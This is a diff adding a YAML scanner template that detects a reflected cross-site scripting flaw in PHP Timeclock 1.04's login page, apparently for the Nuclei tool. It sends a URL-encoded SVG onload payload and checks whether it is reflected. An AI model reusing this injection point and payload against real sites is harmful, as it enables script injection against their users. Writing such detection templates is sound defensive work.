@@ -1,0 +1,25 @@
+id: php-timeclock-xss
+info:
+  author: geeknik
+  description: PHP Timeclock version 1.04 (and prior) suffers from multiple Cross-Site
+    Scripting vulnerabilities
+  name: PHP Timeclock 1.04 XSS
+  reference: https://www.exploit-db.com/exploits/49853
+  severity: medium
+  tags: timeclock,xss
+requests:
+- matchers:
+  - part: header
+    type: word
+    words:
+    - text/html
+  - type: word
+    words:
+    - '''><svg/onload=confirm`xss`>'
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/login.php/''%3E%3Csvg/onload=confirm%60xss%60%3E'
